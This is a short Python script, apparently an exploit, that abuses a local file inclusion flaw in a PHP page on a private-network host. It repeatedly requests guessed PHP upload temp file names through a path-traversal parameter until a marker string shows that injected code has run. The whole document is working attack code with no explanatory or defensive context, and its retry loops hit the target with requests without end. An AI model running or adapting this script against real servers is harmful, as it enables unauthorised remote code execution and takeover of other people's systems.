from urllib import request, parse
 
def main():
 
    target = 'http://192.168.0.25/test.php?c=../tmp/'
    tmpFiles = ['php1.tmp', 'php1A00.tmp', 'php1A01.tmp', 'php1A1A.tmp', 'php1A1B.tmp', 'php1A.tmp', 'php1B.tmp', 'phpAF1C.tmp', 'phpAF0A.tmp', 'phpAEFF.tmp']
 
    while True:
        for tmp in tmpFiles:
            print("Trying: " + tmp)
            if 'ThisShouldNotExist' in doRequest(target + tmp):
                print("Code executed")
                exit()
 
def doRequest(target):
    while True:
        try:
            req = request.Request(target)
            resp = request.urlopen(req, timeout=5)
            return resp.read().decode('UTF-8')
        except:
            pass
 
    return ''
 
if __name__ == '__main__':
    main()
